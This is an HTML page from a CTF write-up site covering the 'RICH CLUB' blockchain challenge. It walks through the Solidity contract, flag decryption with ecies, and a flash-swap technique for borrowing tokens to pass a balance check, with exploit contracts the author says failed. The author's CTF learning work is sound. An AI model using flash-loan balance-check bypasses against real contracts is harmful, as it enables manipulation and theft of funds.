@@ -1,0 +1,352 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>RICH CLUB - RootLee CTF Writeups</title>
+        
+        
+
+
+        <!-- Custom HTML head -->
+        
+
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        
+        <link rel="icon" href="../../favicon.svg">
+        
+        
+        <link rel="shortcut icon" href="../../favicon.png">
+        
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+        
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+        
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        
+
+        
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="../../0x414141/index.html"><strong aria-hidden="true">1.</strong> 0x414141</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../0x414141/blockchain/index.html"><strong aria-hidden="true">1.1.</strong> Blockchain Challenges</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../0x414141/blockchain/sanity_check.html"><strong aria-hidden="true">1.1.1.</strong> sanity check</a></li><li class="chapter-item expanded "><a href="../../0x414141/blockchain/secure_enclave.html"><strong aria-hidden="true">1.1.2.</strong> secure enclave</a></li><li class="chapter-item expanded "><a href="../../0x414141/blockchain/crackme.html"><strong aria-hidden="true">1.1.3.</strong> crackme.sol</a></li><li class="chapter-item expanded "><a href="../../0x414141/blockchain/crypto_casino.html"><strong aria-hidden="true">1.1.4.</strong> crypto casino</a></li><li class="chapter-item expanded "><a href="../../0x414141/blockchain/rich_club.html" class="active"><strong aria-hidden="true">1.1.5.</strong> RICH CLUB</a></li></ol></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                        
+                    </div>
+
+                    <h1 class="menu-title">RootLee CTF Writeups</h1>
+
+                    <div class="right-buttons">
+                        
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        
+                        
+                    </div>
+                </div>
+
+                
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1><a class="header" href="#rich-club" id="rich-club">RICH CLUB</a></h1>
+<p>This final challenge was added as a tie-breaker. It was awful and as far as I am aware no one actually pulled off the correct way to solve the challenge.
+I'll start by discussing the contract and then introduce the solution I used and the solution I should have used.</p>
+<pre><code class="language-solidity">pragma solidity ^0.6;
+//SPDX-License-Identifier: MIT
+
+interface ERC20 {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract RICH_CLUB {
+    ERC20 UNI;
+    event new_member(string pub_key);
+    event send_flag(string pub_key, string flag);
+
+    constructor() public{
+        UNI = ERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
+    }
+
+    function grant_membership(string memory _pub_key) public {
+        require(bytes(_pub_key).length &gt; 120, &quot;invalid public key&quot;);
+        require(UNI.balanceOf(msg.sender) &gt;= 6e20, &quot;you don't look rich to me&quot;);
+        emit new_member(_pub_key);
+    }
+
+    function grant_flag(string memory _pub_key, string memory encoded_flag) public{
+        require(msg.sender == address(0x30cE246A1282169895bf247abaE77BA69d5B2416), &quot;you don't have access to this&quot;);
+        emit send_flag(_pub_key, encoded_flag);
+    }
+}
+</code></pre>
+<p>The contract is simple, there are two functions <code>grant_membership</code> and <code>grant_flag</code>.
+We are supposed to enter the club and a bot should grant us membership.
+To enter the club, we send a public key and the function will check if we meet the requirements.</p>
+<p>The public key had to be Ethereum compliant, which is <code>secp256k1</code>, you can generate a key-pair with <code>openssl</code>.
+See here for more <a href="http://www.herongyang.com/EC-Cryptography/EC-Key-secp256k1-with-OpenSSL.html">http://www.herongyang.com/EC-Cryptography/EC-Key-secp256k1-with-OpenSSL.html</a>.</p>
+<p>So, after generating a valid key we need to pass the second check, having <code>6e20</code> UNI coins in our account.
+This is around 10 ETH, which we can easily get from a faucet.
+To get the coin can go to <a href="https://app.uniswap.org/#/swap">https://app.uniswap.org/#/swap</a> and swap them out.</p>
+<p>This would yield the required coin, we would pass the check and an encrypted flag would be emitted.</p>
+<blockquote>
+<p>This is the only challenge that is not doable after the CTF since the flag emitter is a bot.
+I believe the bot is probably down.</p>
+</blockquote>
+<p>The successful transaction looks like this: <a href="https://rinkeby.etherscan.io/tx/0x0a60eb958bd34785c3e4cf06ad961ad66c1ac04401ad6ffb4cbb158e32eba46f#eventlog">https://rinkeby.etherscan.io/tx/0x0a60eb958bd34785c3e4cf06ad961ad66c1ac04401ad6ffb4cbb158e32eba46f#eventlog</a>.
+The reply is in: <a href="https://rinkeby.etherscan.io/tx/0xc5c7c98c7336422a3df076766444399ded7d68a907678f26950ec95264e1febc#eventlog">https://rinkeby.etherscan.io/tx/0xc5c7c98c7336422a3df076766444399ded7d68a907678f26950ec95264e1febc#eventlog</a>.</p>
+<p>Converting the second part of the log to text would yield a Python byte string which we had to decrypt.
+To do so, I used <code>ecies</code> (<a href="https://github.com/ecies/py">https://github.com/ecies/py</a> their page is great to know more!).</p>
+<p>You would write the following code (where <code>k</code> is your private key and <code>i</code> the received byte string).</p>
+<pre><code class="language-python">import ecies
+ecies.decrypt(k, i)
+&gt; b'flag{l0@ns_ar3nt_7ha7_b@d_tbh8877}'
+</code></pre>
+<h2><a class="header" href="#the-correct-way-to-do-it" id="the-correct-way-to-do-it">The Correct Way To Do It</a></h2>
+<p>So, what makes this the right way to do it? Well, the admins said so.
+I'll walk you through my process.</p>
+<p>When the challenge came out, I had been snooping around the authors contracts.
+While I didn't find anything interesting before, I did after.
+I noticed the author of the challenge contract deployment had made some transactions to the contract, which failed.</p>
+<p>This was one of them: <a href="https://rinkeby.etherscan.io/tx/0xd69cc825db48b8d7083f76622002e3cbdba692444262a74c1b06bbead20c2576">https://rinkeby.etherscan.io/tx/0xd69cc825db48b8d7083f76622002e3cbdba692444262a74c1b06bbead20c2576</a>.
+Clicking in see more we can see:</p>
+<pre><code>Function: flashSwap(address _tokenBorrow, uint256 _amount, address _tokenPay, bytes _userData) ***
+
+MethodID: 0x0322c064
+[0]:  0000000000000000000000001f9840a85d5af5bf1d1762f925bdaddc4201f984
+[1]:  00000000000000000000000000000000000000000000002086ac351052600000
+[2]:  0000000000000000000000001f9840a85d5af5bf1d1762f925bdaddc4201f984
+[3]:  0000000000000000000000000000000000000000000000000000000000000080
+[4]:  0000000000000000000000000000000000000000000000000000000000000040
+[5]:  f2d02606c02b1db40951e1dfc2432a851e41e652947d68ff009c0e09bb8990ea
+[6]:  5417592a2785e4817d65a55c185d8f2be64643265a8b5464165f8e121cb75140
+</code></pre>
+<p>From here, I searched for <code>flashSwap</code> on Google and found Uniswap, which allows for such kind of transactions <a href="https://uniswap.org/docs/v2/smart-contract-integration/using-flash-swaps/">https://uniswap.org/docs/v2/smart-contract-integration/using-flash-swaps/</a>.
+So why is this relevant?</p>
+<p>Flash swaps allow you to pretend to have the tokens, you ask for them to Uniswap,
+they lend you the tokens and in the end of the transaction you return them.</p>
+<p>This is all fine and dandy until you notice the API is a mess and imports in Remix don't really work that well.
+During my search for a better method I found: <a href="https://github.com/Austin-Williams/uniswap-flash-swapper">https://github.com/Austin-Williams/uniswap-flash-swapper</a>, which is the actual code used in the previous Etherscan link.</p>
+<h3><a class="header" href="#the-exploit" id="the-exploit">The Exploit</a></h3>
+<p>Following the provided examples, getting the code to run is easy.</p>
+<pre><code class="language-solidity">contract ExampleContract is UniswapFlashSwapper {
+    constructor(address _DAI, address _WETH) public UniswapFlashSwapper(_DAI, _WETH) {}
+
+    function flashSwap(address _tokenBorrow, uint256 _amount, address _tokenPay, bytes calldata _userData) external {
+        startSwap(_tokenBorrow, _amount, _tokenPay, _userData);
+    }
+
+    function execute(address _tokenBorrow, uint _amount, address _tokenPay, uint _amountToRepay, bytes memory _userData) internal override {
+        RICH_CLUB club = RICH_CLUB(0xC7bEc01281648D3A7F9BB86B811A2de5B1E0cc61);
+        string memory pub_key = &quot;04df58e67b36a2de27b51e3673ed0040db93a44c71029071170dca30d98fb65b5b34b2c3009f3e031640f46924967db0651a750052a1cdafa577a50d0883ed1808&quot;;
+        club.grant_membership(pub_key);
+    }
+}
+</code></pre>
+<p>Now you deploy with the ERC20 (<code>0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984</code>) and WETH (<code>0xc778417E063141139Fce010982780140Aa0cD5Ab</code>) addresses and call the <code>flashSwap</code> functions with the following parameters:</p>
+<ul>
+<li><code>0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984</code></li>
+<li><code>600000000000000000000</code></li>
+<li><code>0xc778417E063141139Fce010982780140Aa0cD5Ab</code></li>
+<li><code>[0]</code></li>
+</ul>
+<p>This would execute the trade and call the function in <code>execute</code>.</p>
+<p>You could also deploy a contract that did all this for you, in this case the contract would encode the function <code>f()</code> and pass it as bytecode:</p>
+<pre><code class="language-solidity">contract Exploit {
+    function f() public {
+        RICH_CLUB club = RICH_CLUB(0xC7bEc01281648D3A7F9BB86B811A2de5B1E0cc61);
+        string memory pub_key = &quot;04df58e67b36a2de27b51e3673ed0040db93a44c71029071170dca30d98fb65b5b34b2c3009f3e031640f46924967db0651a750052a1cdafa577a50d0883ed1808&quot;;
+        club.grant_membership(pub_key);
+    }
+
+    function run() public {
+        ExampleContract ec = ExampleContract(0xE1637EDDFaeabbfd9FE616E34581D62D0E839368);
+        bytes memory payload = abi.encodeWithSignature(&quot;f()&quot;);
+        ec.flashSwap(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984, 600000000000000000000, 0xc778417E063141139Fce010982780140Aa0cD5Ab, payload);
+    }
+}
+</code></pre>
+<p>This would grant you membership and allow you to access the club.
+I was ready to first blood the challenge, so what went wrong?</p>
+<h3><a class="header" href="#the-problem" id="the-problem">The Problem</a></h3>
+<p>The code wouldn't work, why? I still don't know, but I knew for sure it ran all the functions right.
+From my experiments, it was not my problem, but rather the code I got from GitHub.
+I believe it was not returning the tokens correctly.</p>
+<p>I also did not find the error since the error was <code>[object Object]</code>.
+<em>Remix being helpful</em>.</p>
+<p>If you ever find the problem, tweet me <a href="https://twitter.com/duartejmg">@duartejmg</a>.</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        
+                            <a rel="prev" href="../../0x414141/blockchain/crypto_casino.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                        
+
+                        
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                
+                    <a rel="prev" href="../../0x414141/blockchain/crypto_casino.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+            </nav>
+
+        </div>
+
+        
+
+        
+
+        
+
+        
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        
+
+        
+
+        
+        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        
+
+        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        
+
+        
+
+    </body>
+</html>
